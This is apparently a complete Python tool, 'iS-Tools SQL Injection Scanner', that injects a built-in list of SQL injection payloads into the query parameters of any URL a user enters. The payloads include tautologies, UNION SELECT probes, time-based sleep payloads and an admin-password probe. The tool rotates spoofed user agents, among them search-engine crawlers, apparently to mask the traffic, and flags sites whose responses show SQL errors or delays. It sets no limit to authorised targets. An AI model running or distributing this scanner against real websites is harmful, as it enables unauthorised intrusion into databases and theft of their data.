#!/usr/bin/env python3
# coding: utf-8

import requests
import urllib.parse
import time
import sys
import re
import random
import os

# ─── Couleurs ─────────────────────────────────────────
PURPLE_LIGHT = '\033[38;5;177m'
PURPLE = '\033[38;5;129m'
WHITE = '\033[38;5;15m'
RED = '\033[38;5;196m'
GREEN = '\033[38;5;40m'
RESET = '\033[0m'

# ─── ASCII ART ────────────────────────────────────────
ASCII = r"""
                                                                                   ^                      
                                                                                 J@@M                     
                                                                        ^         @@@@^                   
                                                                     ;@@@>         J@@@                   
                                                                      ;@@@J      ;j j@@@}                 
                                                                       ^@@@O  ^J@@@@^;@@@}               
                                                                   >@@@; @@@@^;@@@@@> ;@@@O               
                                                                >j _@@@@j p@@@^;@|      @@@>              
                                                              }@@@@  @@@@j J@@@>                          
                                                          ^a@@ _@@@@;_@@@@a }@@@>                         
                                                       ^} v@@@@^;@@@@@@@@@@@ >@@@v                       
                                                     |@@@@ ^@@@@J@@@@@@@@@@@@;^@@@J                      
                                                  J@M }@@@@ _@@@@@@@@@@@@@@j    @@j                     
                                               ; v@@@@ >@@@@@@@@@@@@@@@@j                                
                                            ^@@@@ ;@@@@v@@@@@@@@@@@@@j^                                   
                                            a@@@@@ >@@@@@@@@@@@@@@a                                       
                                            |@@@@@@@@@@@@@@@@@@J                                          
                                          |a ;@@@@@@@@@@@@@@a;                                            
                                         @@@@ ;@@@@@@@@@@@;                                               
                                        |@@@@@> @@@@@@@>                                                  
                                     }@@@pO@MJ   >pp_                                                     
                                  ;@@@a                                                                   
                               ;@@@p;                                                                     
                            >p@@M>                                                                        
                           }@@>   
"""

# ─── Clear the terminal screen ─────────────────────────
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def animated_ascii():
    for line in ASCII.strip().split('\n'):
        print(f"{PURPLE}{line}{RESET}")
        time.sleep(0.02)

class SQLiScanner:
    def __init__(self):
        # Payloads: classique + erreurs + basiques UNION + time-based simples
        self.payloads = [
            "'", '"', "'--", '"--', "'#", '"#',
            "' OR '1'='1", '" OR "1"="1',
            "' OR 1=1--", '" OR 1=1--',
            "' OR '1'='1' --", '" OR "1"="1" --',
            "' OR '1'='1' /*", '" OR "1"="1" /*',
            "' OR 1=1#",
            "' UNION SELECT NULL--", '" UNION SELECT NULL--',
            "' UNION SELECT NULL,NULL--", '" UNION SELECT NULL,NULL--',
            "' UNION SELECT 1,2--", '" UNION SELECT 1,2--',
            "' UNION SELECT @@version--", '" UNION SELECT @@version--',
            "' OR SLEEP(3)--", '" OR SLEEP(3)--',
            "'; WAITFOR DELAY '0:0:3'--", '"; WAITFOR DELAY \'0:0:3\'--',
            "'; SELECT pg_sleep(3)--", '"; SELECT pg_sleep(3)--',
            "' AND 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS INT)--",
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
            "' AND EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%')--"
        ]
        self.user_agents = [
            # Desktop Chrome Windows
            "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
            "Mozilla/5.0 (X11; CrOS armv7l 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
            # Firefox Desktop
            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:40.0) Gecko/20100101 Firefox/40.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
            # Internet Explorer / Edge / Trident
            "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
            "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MATBJS; rv:11.0) like Gecko",
            # Mobile Safari iOS
            "Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4",
            "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4",
            "Mozilla/5.0 (iPad; CPU OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53",
            # Android Silk Browser
            "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFASWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
            "Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWI Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
            # Other common user agents
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
            "curl/7.64.1",
            "Wget/1.20.3 (linux-gnu)",
            "python-requests/2.25.1",
            "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; U; Android 7.1.1; en-US; Nexus 5X Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36",
        ]
        self.sql_errors = [
            # MySQL / MariaDB
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            # PostgreSQL
            "pg_query(): query failed",
            "syntax error at or near",
            "unterminated quoted string",
            # Microsoft SQL Server
            "microsoft sql server driver",
            "sql server syntax error",
            # Oracle
            "ora-01756",
            "oracle error",
            # SQLite
            "sqlite error",
            # Generic
            "syntax error",
            "warning",
            "mysql_fetch_array",
            "mysql_num_rows",
            "mysql_query",
            "mysql_error",
            "sql syntax",
            "unclosed quotation",
            "unterminated string"
        ]

    def validate_url(self, url):
        """Validate URL structure, scheme and presence of query parameters"""
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme not in ('http', 'https'):
            print(f"{RED}[Error] URL must start with http:// or https://{RESET}")
            return False
        if not parsed.netloc:
            print(f"{RED}[Error] URL must contain a valid domain.{RESET}")
            return False
        if not parsed.query:
            print(f"{RED}[Error] URL must contain query parameters to test (ex: ?id=1).{RESET}")
            return False
        return True

    def test_sql_injection(self, url):
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query)

        if not qs:
            print(f"{RED}[Error] No query parameters found to test.{RESET}")
            return

        vulnerable_found = False

        try:
            for param in qs:
                original_value = qs[param][0]
                for payload in self.payloads:
                    test_qs = qs.copy()
                    test_qs[param] = original_value + payload
                    new_query = urllib.parse.urlencode(test_qs, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                    # Choix aléatoire d'un User-Agent avant la requête
                    random_user_agent = random.choice(self.user_agents)
                    headers = {
                        "User-Agent": random_user_agent
                    }

                    try:
                        start_time = time.time()
                        res = requests.get(test_url, headers=headers, timeout=5)
                        duration = time.time() - start_time

                        body = res.text.lower()

                        # Recherche d'erreurs SQL
                        if any(error in body for error in self.sql_errors):
                            print(f"{GREEN}[SQL Vulnerability] - TRUE | Payload: {repr(payload)} | URL: {test_url}{RESET}")
                            vulnerable_found = True
                            break

                        # Time-based simple check (si délai supérieur à 3 secondes)
                        if "sleep" in payload.lower() and duration > 3:
                            print(f"{GREEN}[SQL Vulnerability] - TRUE (time-based) | Payload: {repr(payload)} | URL: {test_url}{RESET}")
                            vulnerable_found = True
                            break

                        print(f"{PURPLE_LIGHT}[SQL Vulnerability] - False | Payload: {repr(payload)} | URL: {test_url}{RESET}")

                    except requests.exceptions.RequestException as e:
                        print(f"{RED}[Error] Request failed for {test_url}: {e}{RESET}")
                if vulnerable_found:
                    # Stop after first vulnerable param found
                    break

            if not vulnerable_found:
                print(f"{PURPLE}[Info] No SQL Injection vulnerability detected for {url}{RESET}")

        except KeyboardInterrupt:
            print(f"\n{RED}[!] Scan interrupted by user. Returning to main menu.{RESET}")
            return

def run():
    clear_screen()
    os.system("title iS-Tools - SQL Injection Scanner") 
    scanner = SQLiScanner()
    animated_ascii()

    while True:
        print()
        print(f"{PURPLE_LIGHT}===== SQL Injection Scanner - Tapez 'q' ou 'quit' pour revenir au menu principal ====={RESET}")
        target = input(f"{PURPLE_LIGHT}[?]{WHITE} Enter website URL (ex: https://example.com?id=1): ").strip()

        if target.lower() in ['q', 'quit']:
            print(f"{PURPLE_LIGHT}[iS-Tool Info]{WHITE} - Retour au menu principal...{RESET}")
            break

        if not scanner.validate_url(target):
            continue

        print(f"{PURPLE_LIGHT}[SQL Vulnerability] -{WHITE} Website URL : {target}{RESET}")
        print(f"{PURPLE_LIGHT}[SQL Vulnerability] -{WHITE} Vulnerability Search On : {urllib.parse.urlparse(target).netloc}{RESET} (CTRL + C to stop)")

        scanner.test_sql_injection(target)

if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Programme interrompu par l'utilisateur. Sortie propre.{RESET}")
        sys.exit(0)


